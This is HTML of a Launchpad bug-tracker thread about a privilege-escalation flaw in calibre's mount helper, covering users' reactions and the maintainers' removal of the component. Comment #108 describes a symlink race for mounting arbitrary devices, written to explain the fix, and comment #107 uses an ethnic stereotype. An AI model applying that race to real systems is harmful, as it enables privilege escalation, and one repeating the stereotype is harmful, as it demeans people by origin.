        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~gsbabil" class="sprite person">gsbabil (gsbabil)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-05T12:34:21.879941+00:00" title="2011-11-05 12:34:21 UTC">on 2011-11-05</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/98"> #98</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>OFF-TOPIC</p>
<p>This thread has been tagged as &quot;How to Absolutely Not React To Vulnerabilities In Your Code&quot; by Packet-Storm <a rel="nofollow" href="http://packetstormsecurity.org/news/view/20122/">http://<wbr />packetstormsecu<wbr />rity.org/<wbr />news/view/<wbr />20122/</a></p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">OFF-TOPIC 

This thread has been tagged as "How to Absolutely Not React To Vulnerabilities In Your Code" by Packet-Storm http://packetstormsecurity.org/news/view/20122/</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/99" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~user-none" class="sprite person">John Schember (user-none)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-05T12:46:04.565272+00:00" title="2011-11-05 12:46:04 UTC">on 2011-11-05</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/99"> #99</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p><span class="foldable-quoted">&gt; As calibre user I want it to work out of the box ... I agree with ravomavain on this, gksu is the way to go.
</span></p>
<p>The mount helper was only used if udisks is not present. calibre still works out of the box on the vast majority of modern Linux distros.</p>
<p>Adding support for gksu would require dependencies (and the inclusion) on GTK, PolicyKit and gksu-polkit. I don&#x27;t see it being very likely that a distro that does not support udisks will support all of the requirements for gksu. Remember the mount helper was only a fall back when better methods (udisk) was not present.</p>
<p>Also calibre is a Qt project. A Qt (not GTK) solution would make more sense.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">&gt; As calibre user I want it to work out of the box ... I agree with ravomavain on this, gksu is the way to go.

The mount helper was only used if udisks is not present. calibre still works out of the box on the vast majority of modern Linux distros.

Adding support for gksu would require dependencies (and the inclusion) on GTK, PolicyKit and gksu-polkit. I don't see it being very likely that a distro that does not support udisks will support all of the requirements for gksu. Remember the mount helper was only a fall back when better methods (udisk) was not present.

Also calibre is a Qt project. A Qt (not GTK) solution would make more sense.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/100" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~monk-gmx" class="sprite person">Monk (monk-gmx)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-05T13:00:51.271492+00:00" title="2011-11-05 13:00:51 UTC">on 2011-11-05</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/100"> #100</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>While I fully agree that any form of vulnerability should be fixed, I think many here are doing Kovid wrong.</p>
<p>a) He is providing the currently greatest piece of software for ebook management for free, donating large portions of his free time into the project</p>
<p>b) Giving full support here and on the mobileread.com forum</p>
<p>c) Has the full right to be proud of his work and initially doubt and/or question vulnerability reports from an unknown source</p>
<p>d) Has shown that he is willing to learn and improve once he was convinced that people like Dan Rosenberg and Jason A. Donenfeld are really experts in their profession and know what they are talking about</p>
<p>The three main actors (Kovid, Dan, Jason) had a very emotional and kind of non-constructive start (for me attributable to all three - no offence meant) but it turned to the better. Kovid initially being very usability minded while Dan and Jason being completely security minded they came to a more mutual understanding during this discussion.</p>
<p>And given the nature of a discussion, defending once position until being convinced is just normal. Exaggerated and insulting comments like &quot;treating users with disrespect&quot;, &quot;I will uninstall Calibre...&quot;, &quot;Perfect example of how not to react to bug reports&quot; are neither appropriate nor justified.</p>
<p>From my side a big &quot;thumbs up&quot; for Kovid, Dan and Jason and many thanks for your contributions to the Open Source world.</p>
<p>Kind regards</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">While I fully agree that any form of vulnerability should be fixed, I think many here are doing Kovid wrong.

a) He is providing the currently greatest piece of software for ebook management for free, donating large portions of his free time into the project

b) Giving full support here and on the mobileread.com forum

c) Has the full right to be proud of his work and initially doubt and/or question vulnerability reports from an unknown source

d) Has shown that he is willing to learn and improve once he was convinced that people like Dan Rosenberg and Jason A. Donenfeld are really experts in their profession and know what they are talking about

The three main actors (Kovid, Dan, Jason) had a very emotional and kind of non-constructive start (for me attributable to all three - no offence meant) but it turned to the better. Kovid initially being very usability minded while Dan and Jason being completely security minded they came to a more mutual understanding during this discussion.

And given the nature of a discussion, defending once position until being convinced is just normal. Exaggerated and insulting comments like "treating users with disrespect", "I will uninstall Calibre...", "Perfect example of how not to react to bug reports" are neither appropriate nor justified.

From my side a big "thumbs up" for Kovid, Dan and Jason and many thanks for your contributions to the Open Source world.

Kind regards </textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/101" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~mpathy" class="sprite person">Markus Majer (mpathy)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-05T13:24:46.203931+00:00" title="2011-11-05 13:24:46 UTC">on 2011-11-05</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/101"> #101</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>..but for those who want to switch it should be noted that there is the package &quot;fbreader&quot; which is also not bad, here in Launchpad to find at: <a rel="nofollow" href="https://launchpad.net/fbreader">https:/<wbr />/launchpad.<wbr />net/fbreader</a></p>
<p>I only write this because of the question for alternatives - and one of the greatest strenghts of open-source software is the freedom to choose.</p>
<p>But of course, I also hope the people who want to help and the developer, get together and we getting a secure ebook reader again.</p>
<p>If not, I also want to say that there is another big strength of open-source software: The possibility to fork... ;)</p>
<p>Just my 5 eurocents..</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">..but for those who want to switch it should be noted that there is the package "fbreader" which is also not bad, here in Launchpad to find at: https://launchpad.net/fbreader

I only write this because of the question for alternatives - and one of the greatest strenghts of open-source software is the freedom to choose.

But of course, I also hope the people who want to help and the developer, get together and we getting a secure ebook reader again.

If not, I also want to say that there is another big strength of open-source software: The possibility to fork... ;)

Just my 5 eurocents..
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/102" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~user-none" class="sprite person">John Schember (user-none)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-05T13:34:58.469472+00:00" title="2011-11-05 13:34:58 UTC">on 2011-11-05</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/102"> #102</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p><span class="foldable-quoted">&gt; ..but for those who want to switch it should be noted that there is the package &quot;fbreader&quot; which is also not bad, here in Launchpad to find at: <a rel="nofollow" href="https://launchpad.net/fbreader">https:/<wbr />/launchpad.<wbr />net/fbreader</a>
</span></p>
<p>FBReader is only a reader. calibre is a reader, manager, news downloader, converter, and more.</p>
<p><span class="foldable-quoted">&gt; But of course, I also hope the people who want to help and the developer, get together and we getting a secure ebook reader again.
</span></p>
<p>It is secure. If you had read any of the number of posts where multiple people have said that the mount helper (the insecure component) is now removed you would realize this.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">&gt; ..but for those who want to switch it should be noted that there is the package "fbreader" which is also not bad, here in Launchpad to find at: https://launchpad.net/fbreader

FBReader is only a reader. calibre is a reader, manager, news downloader, converter, and more.

&gt; But of course, I also hope the people who want to help and the developer, get together and we getting a secure ebook reader again.

It is secure. If you had read any of the number of posts where multiple people have said that the mount helper (the insecure component) is now removed you would realize this.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/103" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~javier3453" class="sprite person">Neo (javier3453)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-05T15:24:38.584484+00:00" title="2011-11-05 15:24:38 UTC">on 2011-11-05</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/103"> #103</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p><span class="foldable-quoted">&gt;The mount helper was only used if udisks is not present. calibre still works out of the box on the vast majority of modern Linux distros.
</span></p>
<p>Please correct me if I&#x27;m wrong,<br />
even if you have a modern distro with udisks, if you installed calibre via the official binary install, which is recommended in the website (&quot;Please do not use your distribution provided calibre package, as those are often buggy/outdated. Instead use the Binary install described below. &quot;)  then calibre-<wbr />mount-helper gets installed automatically even if udisks is present.  Doesn&#x27;t matter if calibre uses it or not.  Every user that followed that advise is now vulnerable to privilege escalation.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">&gt;The mount helper was only used if udisks is not present. calibre still works out of the box on the vast majority of modern Linux distros.

Please correct me if I'm wrong,
even if you have a modern distro with udisks, if you installed calibre via the official binary install, which is recommended in the website ("Please do not use your distribution provided calibre package, as those are often buggy/outdated. Instead use the Binary install described below. ")  then calibre-mount-helper gets installed automatically even if udisks is present.  Doesn't matter if calibre uses it or not.  Every user that followed that advise is now vulnerable to privilege escalation.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/104" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~user-none" class="sprite person">John Schember (user-none)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-05T17:51:03.644697+00:00" title="2011-11-05 17:51:03 UTC">on 2011-11-05</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/104"> #104</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>@Neo139, That&#x27;s why the mount helper has been removed. It introduces a security vulnerability so the issue is resolved by not installing it on users systems going forward. Just like with any other program a user will need to update to take advantage of security fixes.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">@Neo139, That's why the mount helper has been removed. It introduces a security vulnerability so the issue is resolved by not installing it on users systems going forward. Just like with any other program a user will need to update to take advantage of security fixes.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/105" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~philantrop" class="sprite person">Wulf C. Krueger (philantrop)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-05T20:18:54.281429+00:00" title="2011-11-05 20:18:54 UTC">on 2011-11-05</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/105"> #105</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Gentlemen, Kovid fixed this bug by removing the component (which was the right way to do it). I expect he&#x27;s going to release the fixed version very soon and then everyone who updates will be safe - regardless of using a distro package or the binary installer.</p>
<p>Can we let this go now?</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Gentlemen, Kovid fixed this bug by removing the component (which was the right way to do it). I expect he's going to release the fixed version very soon and then everyone who updates will be safe - regardless of using a distro package or the binary installer.

Can we let this go now?</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/106" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~joss-malsain" class="sprite person">Josselin Mouette (joss-malsain)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-05T20:32:11.667635+00:00" title="2011-11-05 20:32:11 UTC">on 2011-11-05</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/106"> #106</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>@Kovid</p>
<p>The cross-platform library you are looking for already exists; why would anyone gather with you to write a new one?</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">@Kovid

The cross-platform library you are looking for already exists; why would anyone gather with you to write a new one?</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/107" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~politia-morala-deactivatedaccount" class="sprite person-inactive">Siddartha (politia-morala-deactivatedaccount)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-05T21:35:38.876600+00:00" title="2011-11-05 21:35:38 UTC">on 2011-11-05</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/107"> #107</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I am quite surprised how long this thread has gotten.</p>
<p>I side with Kovid. I admire him for doing this app. Because ever since Red Hat 7 or 8 I keep reading on the open source (not free software!) forums something along the lines of „if you need it — go build it, now p*** off as we&#x27;re doing something cool”. He has gotten up and wrote this which is quite unique at the moment. Also he bothers to keep it updated quite often while most of the open source projects (including corporate backed Open Office for example) stagnate.</p>
<p>I also admire him for not playing the racism card. From what I gather most of you come from the so–called western world, and in my life of working for outsourced companies I&#x27;ve seen quite a few orientals supporting their lack of education, language and coding skills with this. This is the best he can do. If you can do better, please help him patch it.</p>
<p>I do agree that he has an „interface” problem, which is more than obvious in his forum postings on mobileread. To my shame I admit I do not know much more than tasted a few curry dishes about his culture. Just try to put yourself in his shoes. Maybe what comes up after a translation as rude, harsh or plain stupid may just be sound normal to him. And attacking him just because of a misunderstanding can just make things worse.</p>
<p>Maybe posting an „unsafe app” label might help. Most probably just diasabling some functions would make more people mad than those who would be happy. Myself I&#x27;m sure I&#x27;d be split between the two. Also, maybe reading closer the software licence as of „no liability whatsoever” would make people more aware. Maybe just by signing Kovid Goyal should be enough of a warning. He could have posted as Jon Johnson just as well.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I am quite surprised how long this thread has gotten. 

I side with Kovid. I admire him for doing this app. Because ever since Red Hat 7 or 8 I keep reading on the open source (not free software!) forums something along the lines of „if you need it — go build it, now p*** off as we're doing something cool”. He has gotten up and wrote this which is quite unique at the moment. Also he bothers to keep it updated quite often while most of the open source projects (including corporate backed Open Office for example) stagnate.

I also admire him for not playing the racism card. From what I gather most of you come from the so–called western world, and in my life of working for outsourced companies I've seen quite a few orientals supporting their lack of education, language and coding skills with this. This is the best he can do. If you can do better, please help him patch it.

I do agree that he has an „interface” problem, which is more than obvious in his forum postings on mobileread. To my shame I admit I do not know much more than tasted a few curry dishes about his culture. Just try to put yourself in his shoes. Maybe what comes up after a translation as rude, harsh or plain stupid may just be sound normal to him. And attacking him just because of a misunderstanding can just make things worse.

Maybe posting an „unsafe app” label might help. Most probably just diasabling some functions would make more people mad than those who would be happy. Myself I'm sure I'd be split between the two. Also, maybe reading closer the software licence as of „no liability whatsoever” would make people more aware. Maybe just by signing Kovid Goyal should be enough of a warning. He could have posted as Jon Johnson just as well.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/108" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~noloader" class="sprite person">Jeffrey Walton (noloader)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-06T02:20:18.954211+00:00" title="2011-11-06 02:20:18 UTC">on 2011-11-06</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/108"> #108</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>&quot;For example, to mount a device not under /dev, simply provide an argv[2] referring to a symlink pointing to somewhere in /dev, and after the realpath()&#x27;d version is checked, switch the target to somewhere else. If you want to do this properly, you need to update the device source such that after calling realpath(), all subsequent references to the device are to the realpath()&#x27;d version.&quot;<br />
Kovid - This is a Time of Check/Time of Use (TOCTOU). You can read more about in Bishop and Dilger&#x27;s paper at <a rel="nofollow" href="http://nob.cs.ucdavis.edu/bishop/papers/1996-compsys/racecond.pdf">http://<wbr />nob.cs.<wbr />ucdavis.<wbr />edu/bishop/<wbr />papers/<wbr />1996-compsys/<wbr />racecond.<wbr />pdf</a>.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">"For example, to mount a device not under /dev, simply provide an argv[2] referring to a symlink pointing to somewhere in /dev, and after the realpath()'d version is checked, switch the target to somewhere else. If you want to do this properly, you need to update the device source such that after calling realpath(), all subsequent references to the device are to the realpath()'d version."
Kovid - This is a Time of Check/Time of Use (TOCTOU). You can read more about in Bishop and Dilger's paper at http://nob.cs.ucdavis.edu/bishop/papers/1996-compsys/racecond.pdf.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/109" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~noloader" class="sprite person">Jeffrey Walton (noloader)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-06T02:28:37.493645+00:00" title="2011-11-06 02:28:37 UTC">on 2011-11-06</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/109"> #109</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
